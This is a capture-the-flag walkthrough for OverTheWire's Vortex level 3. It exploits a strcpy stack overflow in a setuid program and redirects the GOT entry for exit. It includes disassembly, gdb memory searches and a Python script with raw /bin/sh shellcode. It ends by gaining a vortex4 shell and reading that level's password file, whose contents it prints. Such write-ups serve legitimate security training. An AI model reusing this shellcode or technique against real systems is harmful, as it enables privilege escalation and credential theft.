## Vortex Level 3 → Level 4
### A Stack Overflow with a Difference

Problem page: <http://overthewire.org/wargames/vortex/vortex3.html>


The exploitable part of this program is the `strcpy` which does not check the length of the data being copied, so if we pass in more data into the program we'll be able to overwrite the value of `lpp`, which is then conveniently dereferenced and set to point to the address of `buf`.

We've already dealt with finding the offset between things on the stack in gdb in Vortex Level 1, so we'll skip over that, with the following shellcode we only need to figure out where we need to point `lpp`.

In level 3 the program exits with `exit(0)`, rather than returning, so overwriting the return address would not work, we'll need to find another way, let's see how the call to `exit` works.

```console
vortex3@vortex:~$ objdump /vortex/vortex3 --disassemble-all --section=.plt | grep -A 3 exit
08048310 <exit@plt>:
 8048310:       ff 25 34 97 04 08       jmp    *0x8049734
 8048316:       68 10 00 00 00          push   $0x10
 804831b:       e9 c0 ff ff ff          jmp    80482e0 <_init+0x2c>
```

So we'll search for memory addresses containing `0x8049734` in the range of our program's memory

```console
vortex3@vortex:~$ readelf /vortex/vortex3 --sections
vortex3@vortex:/tmp/36$ readelf /vortex/vortex3 --sections
There are 30 section headers, starting at offset 0x8a8:

Section Headers:
[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
[ 0]                   NULL            00000000 000000 000000 00      0   0  0
[ 1] .interp           PROGBITS        08048134 000134 000013 00   A  0   0  1
...
[25] .bss              NOBITS          0804974c 00074c 000004 00  WA  0   0  1
[26] .comment          PROGBITS        00000000 00074c 000056 01  MS  0   0  1
[27] .shstrtab         STRTAB          00000000 0007a2 000106 00      0   0  1
[28] .symtab           SYMTAB          00000000 000d58 000460 10     29  45  4
[29] .strtab           STRTAB          00000000 0011b8 00026b 00      0   0  1
```

We'll search the memory with `gdb`

```console
vortex3@vortex:/tmp/36$ env TERM=screen-256color gdb --args /vortex/vortex3 `cat pl.txt`
Reading symbols from /vortex/vortex3...(no debugging symbols found)...done.
(gdb) start
Temporary breakpoint 1, 0x08048430 in main ()
(gdb) find 0x8048134,0x804974c,0x8049734
0x80482a4
0x8048312 <exit@plt+2>
0x80492a4
0x8049312
4 patterns found.
```

Okay, we have enough info for our exploitative input now.

```python
import sys

sys.stdout.write("\xeb\x2b\x5e\x31\xc0\xb0\x46\x31\xdb\x66\xbb\xfa\x01\x31\xc9\x66" +     #Shellcode
                 "\xb9\xfa\x01\xcd\x80\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89" +
		 "\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x31\xd2\xcd\x80\xe8\xd0\xff\xff" +
		 "\xff\x2f\x62\x69\x6e\x2f\x73\x68\xff\xff\xff" +
		 "\x90"*72 +                                                              # Distance to lpp
		 "\x12\x93\x04\x08")                                                      # .got address
```

Let's see if this works out (it does, I checked before writing this).

```console
vortex3@vortex:/tmp/36$ /vortex/vortex3 `python script.py`
$ whoami
vortex4
$ cat /etc/vortex_pass/vortex4
2YmgK1=jw
```

On to level 4
